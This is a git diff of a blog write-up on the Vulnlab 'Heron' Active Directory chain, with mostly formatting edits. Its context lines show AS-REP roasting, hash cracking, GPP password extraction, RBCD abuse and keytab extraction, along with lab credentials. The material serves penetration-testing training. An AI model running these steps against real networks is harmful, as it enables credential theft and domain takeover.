@@ -1,14 +1,18 @@
 ---
 
 layout: post
-title: Heron Chain (Vulnlab Medium) 
-date: 27-07-2024
+title: VL Heron (Chain medium) 
+date: 28-07-2024
 categories: [documentation]
-tag: [Vulnlab, Chain, Active Directory]  
+tag: [Vulnlab, Chain, Active Directory, RBCD, Linux AD, Through Proxy]
 author: Ethicxz
 ---
-
-# Enumeration
+# Before Starting
+```console
+Me > 10.8.2.163
+Target > 10.10.173.53 ; 10.10.173.54
+```
+## Enumeration
 
 ```bash
 ping 10.10.173.53 > 64 bytes from 10.10.173.54: icmp_seq=1 ttl=63 time=31.3 ms 
@@ -37,7 +41,7 @@ _local  pentest  svc-web-accounting-d@heron.vl  svc-web-accounting@heron.vl
 ```
 Now that we are connected we can start enumerating through this machine, let's do this with fscan
 
-https://github.com/shadow1ng/fscan
+[https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)
 
 Upload fscan on the target machine and run it :
 
@@ -66,7 +70,7 @@ start vulscan
 ```
 Now we can forward :
 
-https://github.com/nicocha30/ligolo-ng (i used ligolo)
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) (i used ligolo)
 
 ```bash
 # local machine 
@@ -108,9 +112,9 @@ SMB         10.10.173.53    445    MUCDC            [-] heron.vl\toto: STATUS_LO
 ```
 There is no Guest Session so we need to find creds
 
-# First User
+## First user, samuel.davies
 
-Let's try ASREProast : https://tools.thehacker.recipes/impacket/examples/getnpusers.py
+Let's try ASREProast : [https://tools.thehacker.recipes/impacket/examples/getnpusers.py](https://tools.thehacker.recipes/impacket/examples/getnpusers.py)
 
 ```bash
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "10.10.173.53" "heron.vl"/
@@ -120,7 +124,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [-] User julian.pratt doesn't have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$23$samuel.davies@HERON.VL:7f8381c531585de12e3932be634b005b$79840d0766dafb30d2b50ada6fe153870a3941bd80bf74e414113a40374f75ccf6501f26619f41a5c9c46a8e36463b2f014308770e534bb45cea9b32e301275727b83aa743b1545f54890d4784609023b37e99c5b81b50eb07031618bb8d80017a7b1b183dac6e13b877b48150dc9217a324f27f2e22c57d05a6671532d9253492066085b0d9c2df30f9a8a16ada2915b2953e593490d560237615f1a6bcc765a1e39c4a2d4d8ddb484472bbe5647ea864fa395b1127ff75a25868f3a136cd5722ca726f22715208cdfafa39821adea3261c5567b94e5ae65a5f8c38b8abfeb6f2c64393
 ```
-Nice ! Now crack it : https://www.thehacker.recipes/a-d/movement/credentials/cracking
+Nice ! Now crack it : [https://www.thehacker.recipes/a-d/movement/credentials/cracking](https://www.thehacker.recipes/a-d/movement/credentials/cracking)
 
 ```bash
 hashcat --hash-type 18200 --attack-mode 0 ASREProastables.txt /usr/share/wordlists/rockyou.txt
@@ -153,6 +157,8 @@ SMB         10.10.173.53    445    MUCDC            NETLOGON        READ        
 SMB         10.10.173.53    445    MUCDC            SYSVOL          READ            Logon server share
 SMB         10.10.173.53    445    MUCDC            transfer$       READ,WRITE
 ```
+## Getting a shell on the windows machine
+
 We can read in SYSVOL and we saw that there were service accounts (svc_web)
 
 ```bash
@@ -171,7 +177,7 @@ GPP_PASS... 10.10.173.53    445    MUCDC            acctDisabled: 0
 GPP_PASS... 10.10.173.53    445    MUCDC            subAuthority: RID_ADMIN
 GPP_PASS... 10.10.173.53    445    MUCDC            userName: Administrator (built-in)
 ```
-(If you want to know how gpp password work : https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a)
+If you want to know how gpp password work : [https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a](https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a)
 
 Nice ! Let's try this pass for every user we have :
 
@@ -247,6 +253,8 @@ Listening on 0.0.0.0 9001
 </configuration>
 <!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
 ```
+## Root on linux machine
+
 Now after some digging i found this :
 
 ```powershell
@@ -286,6 +294,8 @@ SMB  10.10.173.53    445    MUCDC   [+] heron.vl\julian.pratt:Deplete5DenialDeal
 ```
 Go in his home dir and we will find mucjmp.lnk file
 
+## Getting adm_prju
+
 ```bash
 cat mucjmp.lnk
 2t`��ف+B�� �gP�O� �:i�+00�/C:\�1�X�sPROGRA~1t   ﾨR�B�X�s.BJz
@@ -309,9 +319,9 @@ cme ldap heron.vl -u samuel.davies -p 'l6fkiy9oN' -k --bloodhound -ns 10.10.173.
 ``` 
 ![alt text](../assets/image_heron/6er.png)
 
-# PRIVESC
+## Privesc RBCD on SPN-less users
 
-Let's abuse this : https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd
+Let's abuse this : [https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd)
 
 ```bash
 nxc ldap "10.10.173.53" -u 'adm_prju'  -p 'ayDMWV929N9wAiB4' -M maq
@@ -355,9 +365,11 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 ```
 This is normal but the writeup is long enough as it is so I put some links which explain why it doesn't work and I go straight to the attack
 
-https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
-https://tttang.com/archive/1617/#toc_user-to-user-kerberos-authentication-u2u
-https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users
+[https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
+
+[https://tttang.com/archive/1617/#toc_user-to-user-kerberos-authentication-u2u](https://tttang.com/archive/1617/#toc_user-to-user-kerberos-authentication-u2u)
+
+[https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)
 
 ```bash
 # Obtain a TGT through overpass-the-hash to use RC4
@@ -384,13 +396,13 @@ SMB         10.10.173.53    445    MUCDC            [+] heron.vl\_admin:399[...]
 
 AND WE ARE ROOT !!, if you have any questions you can dm me on discord : 'ethicxz.' or on instagram : 'eliott.la'
 
-# OTHER WAY TO PRIVESC 
+## Other way to privesc RBCD with a machine
 
 There is also a another way to RBCD in this chain, when we got the root on the target linux machine we didnt digging anything, but we can do this :
 
-https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab
+[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab)
 
-https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py
+[https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py](https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py)
 
 ```bash
 root@frajmp:/tmp# python3 keytabextract.py /etc/krb5.keytab
